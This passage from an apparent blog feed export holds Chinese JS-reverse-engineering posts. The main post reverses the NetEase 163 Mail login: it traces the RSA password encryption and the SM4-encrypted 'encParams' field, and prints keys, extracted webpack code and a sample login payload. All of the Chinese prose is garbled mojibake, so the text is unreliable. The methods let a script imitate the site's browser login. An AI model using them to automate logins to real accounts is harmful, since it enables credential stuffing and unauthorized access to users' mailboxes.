class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title function_">U</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> - <span class="number">1</span>)</span><br><span class="line">              , n = <span class="title function_">U</span>(<span class="title function_">R</span>(t, <span class="variable language_">this</span>.<span class="property">mu</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>)</span><br><span class="line">              , r = <span class="title function_">O</span>(<span class="title function_">B</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>), <span class="title function_">B</span>(<span class="title function_">R</span>(n, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>));</span><br><span class="line">            r.<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, <span class="variable language_">this</span>.<span class="property">bkplus1</span>));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">G</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>; o; )</span><br><span class="line">                o = <span class="title function_">G</span>(r = <span class="title function_">O</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">X</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title function_">R</span>(e, t);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">modulo</span>(n)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">j</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = e, o = t; <span class="number">0</span> != (<span class="number">1</span> &amp; o.<span class="property">digits</span>[<span class="number">0</span>]) &amp;&amp; (n = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(n, r)),</span><br><span class="line">            <span class="number">0</span> != (o = <span class="title function_">F</span>(o, <span class="number">1</span>)).<span class="property">digits</span>[<span class="number">0</span>] || <span class="number">0</span> != <span class="title function_">I</span>(o); )</span><br><span class="line">                r = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(r, r);</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> K = &#123;&#125;;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">W</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">e</span> = <span class="title function_">C</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">d</span> = <span class="title function_">C</span>(t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">m</span> = <span class="title function_">C</span>(n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">chunkSize</span> = <span class="string">&quot;number&quot;</span> != <span class="keyword">typeof</span> r ? <span class="number">2</span> * <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">m</span>) : r / <span class="number">8</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">radix</span> = <span class="number">16</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">barrett</span> = <span class="keyword">new</span> <span class="title function_">Z</span>(<span class="variable language_">this</span>.<span class="property">m</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        K.<span class="property">NoPadding</span> = <span class="string">&quot;NoPadding&quot;</span>,</span><br><span class="line">        K.<span class="property">PKCS1Padding</span> = <span class="string">&quot;PKCS1Padding&quot;</span>,</span><br><span class="line">        K.<span class="property">RawEncoding</span> = <span class="string">&quot;RawEncoding&quot;</span>,</span><br><span class="line">        K.<span class="property">NumericEncoding</span> = <span class="string">&quot;NumericEncoding&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> Q = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> V = &#123;</span><br><span class="line">            <span class="attr">encryptedString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Q || (<span class="title function_">f</span>(<span class="number">262</span>),</span><br><span class="line">                Q = <span class="keyword">new</span> <span class="title function_">W</span>(<span class="string">&quot;10001&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;BA58236D7F337C2B728A05F31028833AF83220330B129DC2407109776B644492BD7BBD8B15498C9C510B915FC4C559FE986F61867337785DB32C284C4E07FF256965DE53490CBBA28F14D413D407986ED3DF0E03032031EDD97054C3E6F4F8B322238EB5B0249556F99D9182B281F04B18CE9155332AF71C8A1A2E49087A571B&quot;</span>,<span class="number">1024</span>)),</span><br><span class="line">                <span class="variable language_">window</span>.<span class="title function_">btoa</span>(<span class="keyword">function</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> o, i, a, u, l, c, s, d, f, m = <span class="keyword">new</span> <span class="title class_">Array</span>, g = t.<span class="property">length</span>, h = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (u = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> n ? n == K.<span class="property">NoPadding</span> ? <span class="number">1</span> : n == K.<span class="property">PKCS1Padding</span> ? <span class="number">2</span> : <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">                    l = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r &amp;&amp; r == K.<span class="property">RawEncoding</span> ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span> == u ? g &gt; e.<span class="property">chunkSize</span> &amp;&amp; (g = e.<span class="property">chunkSize</span>) : <span class="number">2</span> == u &amp;&amp; g &gt; e.<span class="property">chunkSize</span> - <span class="number">11</span> &amp;&amp; (g = e.<span class="property">chunkSize</span> - <span class="number">11</span>),</span><br><span class="line">                    o = <span class="number">0</span>,</span><br><span class="line">                    i = <span class="number">2</span> == u ? g - <span class="number">1</span> : e.<span class="property">chunkSize</span> - <span class="number">1</span>; o &lt; g; )</span><br><span class="line">                        u ? m[i] = t.<span class="title function_">charCodeAt</span>(o) : m[o] = t.<span class="title function_">charCodeAt</span>(o),</span><br><span class="line">                        o++,</span><br><span class="line">                        i--;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">1</span> == u &amp;&amp; (o = <span class="number">0</span>),</span><br><span class="line">                    i = e.<span class="property">chunkSize</span> - g % e.<span class="property">chunkSize</span>; i &gt; <span class="number">0</span>; ) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="number">2</span> == u) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()); !c; )</span><br><span class="line">                                c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>());</span><br><span class="line">                            m[o] = c</span><br><span class="line">                        &#125; <span class="keyword">else</span></span><br><span class="line">                            m[o] = <span class="number">0</span>;</span><br><span class="line">                        o++,</span><br><span class="line">                        i--</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">2</span> == u &amp;&amp; (m[g] = <span class="number">0</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">2</span>] = <span class="number">2</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">1</span>] = <span class="number">0</span>),</span><br><span class="line">                    s = m.<span class="property">length</span>,</span><br><span class="line">                    o = <span class="number">0</span>; o &lt; s; o += e.<span class="property">chunkSize</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (d = <span class="keyword">new</span> p,</span><br><span class="line">                        i = <span class="number">0</span>,</span><br><span class="line">                        a = o; a &lt; o + e.<span class="property">chunkSize</span>; ++i)</span><br><span class="line">                            d.<span class="property">digits</span>[i] = m[a++],</span><br><span class="line">                            d.<span class="property">digits</span>[i] += m[a++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">                        f = e.<span class="property">barrett</span>.<span class="title function_">powMod</span>(d, e.<span class="property">e</span>),</span><br><span class="line">                        h += <span class="number">1</span> == l ? <span class="title function_">b</span>(f) : <span class="number">16</span> == e.<span class="property">radix</span> ? <span class="title function_">S</span>(f) : <span class="title function_">T</span>(f, e.<span class="property">radix</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> h</span><br><span class="line">                &#125;(Q, e, K.<span class="property">PKCS1Padding</span>, K.<span class="property">RawEncoding</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        t.<span class="property">default</span> = V</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘æ˜“163é‚®ç®±ç™»å½•RSAåŠ å¯†</title>
      <link href="/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€ã€é€†å‘ç›®æ ‡"><a href="#ä¸€ã€é€†å‘ç›®æ ‡" class="headerlink" title="ä¸€ã€é€†å‘ç›®æ ‡"></a>ä¸€ã€é€†å‘ç›®æ ‡</h1><ul><li>ç›®æ ‡ï¼šç½‘æ˜“163é‚®ç®±ç™»å½•RSAåŠ å¯†018</li><li>é“¾æ¥ï¼š<a href="https://smart.mail.163.com/login.htm">https://smart.mail.163.com/login.htm</a></li><li>ç®€ä»‹ï¼šå®šä½<strong>å¯†ç å­—æ®µ</strong>çš„åŠ å¯†ç®—æ³•å’Œ<strong>encParams</strong>å‚æ•°çš„åŠ å¯†è¿‡ç¨‹</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081044026.png" alt="image.png"> </p><h1 id="äºŒã€é€†å‘å‚æ•°"><a href="#äºŒã€é€†å‘å‚æ•°" class="headerlink" title="äºŒã€é€†å‘å‚æ•°"></a>äºŒã€é€†å‘å‚æ•°</h1><h2 id="1-å¯†ç å­—æ®µpw"><a href="#1-å¯†ç å­—æ®µpw" class="headerlink" title="1. å¯†ç å­—æ®µpw"></a>1. å¯†ç å­—æ®µpw</h2><h3 id="ï¼ˆ1ï¼‰å®šä½å¯†ç å­—æ®µ"><a href="#ï¼ˆ1ï¼‰å®šä½å¯†ç å­—æ®µ" class="headerlink" title="ï¼ˆ1ï¼‰å®šä½å¯†ç å­—æ®µ"></a>ï¼ˆ1ï¼‰å®šä½å¯†ç å­—æ®µ</h3><p>æŸ¥çœ‹networkå­—æ®µï¼Œå‘ç°æœ‰3ä¸ªå¯èƒ½æ¶‰åŠçš„è¯·æ±‚æ¥å£ï¼šâ€gtâ€ã€â€lâ€ã€â€powGetpâ€</p><p>é‡Œé¢è¯·æ±‚ä½“éƒ½ä¸º encParamsåŠ å¯†å­—æ®µï¼Œæ‰€ä»¥åˆ¤æ–­ä¸å‡ºå“ªä¸ªæ¥å£æ˜¯çœŸæ­£çš„passwordåŠ å¯†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048395.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œè¿™å—éœ€è¦å°†è¿™ä¸‰ä¸ªæ¥å£éƒ½æ‰“XHRæ–­ç‚¹ã€‚æ¯ä¸ªæ¥å£éƒ½è¿›è¡Œè·Ÿæ ˆã€‚</p><p>ç›´æ¥æ— è„‘xhræ–­ç‚¹ï¼Œä¸€æ­¥æ­¥å‘ä¸Šè·Ÿæ ˆå°±å®Œäº‹äº†ã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048448.png" alt="image.png"> </p><h3 id="ï¼ˆ2ï¼‰ç¬¬ä¸€ä¸ªæ¥å£ï¼šâ€gtâ€"><a href="#ï¼ˆ2ï¼‰ç¬¬ä¸€ä¸ªæ¥å£ï¼šâ€gtâ€" class="headerlink" title="ï¼ˆ2ï¼‰ç¬¬ä¸€ä¸ªæ¥å£ï¼šâ€gtâ€"></a>ï¼ˆ2ï¼‰ç¬¬ä¸€ä¸ªæ¥å£ï¼šâ€gtâ€</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057585.png" alt="image.png"> </p><p>å‘å‰è·Ÿæ ˆï¼Œçœ‹èƒ½ä¸èƒ½å®šä½åˆ°å’Œpasswordç›¸å…³çš„å†…å®¹ï¼šè¿™å—å…·ä½“è¿‡ç¨‹å°±çœç•¥äº†â€¦â€¦</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057559.png" alt="image.png"> </p><p>ç»§ç»­å‘å‰ä¸€æ­¥è·Ÿæ ˆï¼Œå‘ç°è¾“å…¥çš„ç”¨æˆ·åæˆåŠŸæ˜¾ç¤ºäº†ï¼Œä½†æ²¡æœ‰ä»»ä½•å¯†ç ç›¸å…³çš„å­—æ®µ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058772.png" alt="image.png"> </p><p>å‘å‰ç»§ç»­è·Ÿä¸€ä¸‹æ ˆï¼Œç¡®å®æ²¡æœ‰å‘ç°ä»»ä½•å¯†ç å­—æ®µç›¸å…³å†…å®¹ã€‚çŒœæµ‹è¯¥<strong>æ¥å£ â€œgtâ€ ä¸æ˜¯å¯†ç åŠ å¯†æ¥å£</strong>ã€‚</p><h3 id="ï¼ˆ3ï¼‰ç¬¬äºŒä¸ªæ¥å£ï¼šâ€lâ€"><a href="#ï¼ˆ3ï¼‰ç¬¬äºŒä¸ªæ¥å£ï¼šâ€lâ€" class="headerlink" title="ï¼ˆ3ï¼‰ç¬¬äºŒä¸ªæ¥å£ï¼šâ€lâ€"></a>ï¼ˆ3ï¼‰ç¬¬äºŒä¸ªæ¥å£ï¼šâ€lâ€</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058487.png" alt="image.png"> </p><p>å‘å‰è·Ÿæ ˆâ€¦â€¦</p><p>æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªæ ˆä¸­æåˆ°äº†â€unâ€å’Œâ€pwâ€å­—æ®µï¼Œä¸å‡ºæ„å¤–ï¼Œå¯¹åº”ä¸‹æ¥ï¼Œåº”è¯¥æ˜¯ç”¨æˆ·åå’ŒåŠ å¯†åçš„å¯†ç </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058410.png" alt="image.png"> </p><p>å†å‘å‰è·Ÿæ ˆï¼Œæœ€ç»ˆå®šä½pwå­—æ®µæœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081059207.png" alt="image.png"> </p><p>å†å¾€å‰è·Ÿæ ˆï¼Œå‘ç°æ‰¾ä¸åˆ°pwå­—æ®µäº†ã€‚æ‰€ä»¥ï¼Œè¿™å—åœ¨å½“å‰JSä¸­æœç´¢å…³é”®å­— â€œpwâ€</p><p>æ‰¾åˆ°å¤šå¤„ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°æ¶‰åŠåˆ°pwçš„ä»£ç éƒ½æœ‰å‡ºç°å‡½æ•°<strong>MP.encrypt2</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e.pw = MP.encrypt2(this.__password);</span><br><span class="line">t.pw = MP.encrypt2(this.$refs.mpinput._$getValue() || &quot;0&quot;);</span><br><span class="line">t.pw = MP.encrypt2(i);</span><br><span class="line">e.pw = MP.encrypt2(this.__password);</span><br></pre></td></tr></table></figure><p>ä¸‹æ–­ç‚¹ï¼Œæœ€ç»ˆåœ¨ â€œt.pw &#x3D; MP.encrypt2(i);â€ ä½ç½®æ–­ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081107555.png" alt="image.png"> </p><p>ä¹Ÿå°±è¯´æ˜ <strong>MP.encrypt2</strong> æ˜¯çœŸæ­£çš„åŠ å¯†å‡½æ•°ã€‚</p><h3 id="ï¼ˆ4ï¼‰ç¬¬ä¸‰ä¸ªæ¥å£â€powGetpâ€"><a href="#ï¼ˆ4ï¼‰ç¬¬ä¸‰ä¸ªæ¥å£â€powGetpâ€" class="headerlink" title="ï¼ˆ4ï¼‰ç¬¬ä¸‰ä¸ªæ¥å£â€powGetpâ€"></a>ï¼ˆ4ï¼‰ç¬¬ä¸‰ä¸ªæ¥å£â€powGetpâ€</h3><p>è¿™ä¸ªå°±ä¸è¯´äº†ï¼Œå’Œä¸Šé¢åˆ†ææ€è·¯ç±»ä¼¼ã€‚çœ‹äº†ä¸‹è·Ÿå¯†ç å­—æ®µä¹Ÿæ²¡å•¥å…³ç³»</p><h3 id="ï¼ˆ5ï¼‰MP-encrypt2åŠ å¯†å‡½æ•°åˆ†æ"><a href="#ï¼ˆ5ï¼‰MP-encrypt2åŠ å¯†å‡½æ•°åˆ†æ" class="headerlink" title="ï¼ˆ5ï¼‰MP.encrypt2åŠ å¯†å‡½æ•°åˆ†æ"></a>ï¼ˆ5ï¼‰MP.encrypt2åŠ å¯†å‡½æ•°åˆ†æ</h3><p>ç¡®è®¤ä¸ºRSAåŠ å¯†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109251.png" alt="image.png"> </p><p>ç¡¬æ‰£ä»£ç ï¼šæå®šï¼</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line"><span class="comment">//å‰é¢ä»£ç çœç•¥ï¼Œå°±ç›´æ¥å°†è¿™ä¸ªJSæ‹¿ä¸‹æ¥å°±è¡Œ</span></span><br><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt2</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5gsH+AA4XWONB5TDcUd+xCz7ejOFHZKlcZDx+pF1i7Gsvi1vjyJoQhRtRSn950x498VUkx7rUxg1/ScBVfrRxQOZ8xFBye3pjAzfb22+RCuYApSVpJ3OO3KsEuKExftz9oFBv3ejxPlYc5yq7YiBO8XlTnQN0Sa4R4qhPO3I2MQIDAQAB-----END PUBLIC KEY-----&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> t = <span class="variable constant_">RSA</span>.<span class="title function_">getPublicKey</span>(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">RSA</span>.<span class="title function_">encrypt</span>(e, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109195.png" alt="image.png"> </p><h2 id="2-encParamsåŠ å¯†å‚æ•°"><a href="#2-encParamsåŠ å¯†å‚æ•°" class="headerlink" title="2. encParamsåŠ å¯†å‚æ•°"></a>2. encParamsåŠ å¯†å‚æ•°</h2><p>å…¨å±€æœç´¢ï¼Œå®šä½åˆ°å‚æ•°ä½ç½®ï¼šç¡®è®¤SM4åŠ å¯†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081110950.png" alt="image.png"> </p><h3 id="ï¼ˆ1ï¼‰è·Ÿè¿›åŠ å¯†å‡½æ•°r-sm4Encrypt"><a href="#ï¼ˆ1ï¼‰è·Ÿè¿›åŠ å¯†å‡½æ•°r-sm4Encrypt" class="headerlink" title="ï¼ˆ1ï¼‰è·Ÿè¿›åŠ å¯†å‡½æ•°r._$sm4Encrypt"></a>ï¼ˆ1ï¼‰è·Ÿè¿›åŠ å¯†å‡½æ•°r._$sm4Encrypt</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_p._$sm4Encrypt = function(e) &#123;</span><br><span class="line">        return window.URSSM4.encrypt(JSON.stringify(e), _sm4pubkey)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111173.png" alt="image.png"> </p><p>è¿™å—çš„ _sm4pubkey æ˜¯å›ºå®šå€¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_sm4pubkey = &#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111473.png" alt="image.png"> </p><p>å®šä½ â€œwindow.URSSM4.encryptâ€ å‡½æ•°ä½ç½®ï¼Œå‘ç°æ˜¯webpackçš„å½¢å¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111841.png" alt="image.png"> </p><h3 id="ï¼ˆ2ï¼‰webpackä»£ç åˆ†æ"><a href="#ï¼ˆ2ï¼‰webpackä»£ç åˆ†æ" class="headerlink" title="ï¼ˆ2ï¼‰webpackä»£ç åˆ†æ"></a>ï¼ˆ2ï¼‰webpackä»£ç åˆ†æ</h3><p>â‘ ä»£ç å…ˆå¤åˆ¶è¿›notepad++ä¸­</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111138.png" alt="image.png"> </p><p>â‘¡æ‰¾åˆ°åˆ†å‘å™¨çš„ä½ç½®</p><p>å‘ç°è¿™å—æœ‰è°ƒç”¨çš„è¿‡ç¨‹ï¼Œä¸”è°ƒç”¨å‡½æ•°ä¸ºnï¼Œæ‰€ä»¥çŒœæµ‹å‡½æ•°næ‰€åœ¨ä½ç½®å¯èƒ½ä¸ºåˆ†å‘å™¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112926.png" alt="image.png"> </p><p>ä¸‹æ–­ç‚¹ï¼Œé‡æ–°åˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼ˆå› ä¸ºwebpackæ˜¯åœ¨é¡µé¢æœ€åˆå°±åŠ è½½è¿›æ¥çš„ï¼Œæ‰€ä»¥éœ€è¦åˆ·æ–°é¡µé¢ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112841.png" alt="image.png"> </p><p>æˆåŠŸæ–­ä¸‹ï¼Œå®šä½åˆ°nçš„ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112802.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112996.png" alt="image.png"> </p><p>åˆ†å‘å™¨ä»£ç ç®€å•æ”¹å†™ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _e</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = n[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== r)</span><br><span class="line">      <span class="keyword">return</span> r.<span class="property">exports</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,i)</span><br><span class="line">     r = n[i] = &#123;</span><br><span class="line">       <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">       &#125;;</span><br><span class="line">    <span class="keyword">return</span> t[i](r, r.<span class="property">exports</span>, e),</span><br><span class="line">    r.<span class="property">exports</span></span><br><span class="line">  &#125;</span><br><span class="line">  _e = e</span><br><span class="line">&#125;(&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//åŠ è½½webpackæ¨¡å—</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>â‘¢æ‰£å–åŠ å¯†æ¨¡å—ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤ªå¤šäº†ï¼Œçœç•¥â€¦â€¦</span><br></pre></td></tr></table></figure><p>â‘£ç¼–å†™åŠ å¯†å‡½æ•°</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd = <span class="string">&#x27;&#123;&quot;un&quot;:&quot;admin123@163.com&quot;,&quot;pw&quot;:&quot;ffhnKr8vA0EIEEclcRR6Ik8sDkEkjcvalofxRMQcS+ADdxyWoPpZFE6pehucjf/+0F5MliRjC51VMPUkGK/ceLj5fTlhNj34pHSfnU7zMd35XwSaPax/ucpNWpStm4tb0gyl+rb0ulEzQn7Tk4FR1hCUcE5kyAjo52567M+Eb8Q=&quot;,&quot;pd&quot;:&quot;mail163&quot;,&quot;l&quot;:0,&quot;d&quot;:30,&quot;t&quot;:1695908789441,&quot;pkid&quot;:&quot;CvViHzl&quot;,&quot;domains&quot;:&quot;163.com&quot;,&quot;tk&quot;:&quot;8753c188d3bbad4996c4cf699e3beef5&quot;,&quot;pwdKeyUp&quot;:1,&quot;channel&quot;:0,&quot;topURL&quot;:&quot;https://smart.mail.163.com/login.htm&quot;,&quot;rtid&quot;:&quot;RXuDHOFWWNPiiotxQy3UqrnZvRh7yrSM&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _sm4pubkey = <span class="string">&#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_e</span>(<span class="string">&#x27;9579&#x27;</span>); <span class="comment">//å®šä¹‰å¯¼å‡ºå‡½æ•°ï¼Œå°†åŠ å¯†æ¨¡å—å¯¼å‡ºä¸ºå…¨å±€å˜é‡p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">pwd</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> p.<span class="title function_">encrypt</span>(pwd, _sm4pubkey)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ3ï¼‰å®Œæ•´ä»£ç æµ‹è¯•"><a href="#ï¼ˆ3ï¼‰å®Œæ•´ä»£ç æµ‹è¯•" class="headerlink" title="ï¼ˆ3ï¼‰å®Œæ•´ä»£ç æµ‹è¯•"></a>ï¼ˆ3ï¼‰å®Œæ•´ä»£ç æµ‹è¯•</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç•¥ç•¥ç•¥â€¦â€¦</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115683.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115482.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> webpack </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tç¿¼äº‘æ‰£webpackåŸç”Ÿä»£ç </title>
      <link href="/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/</url>
      
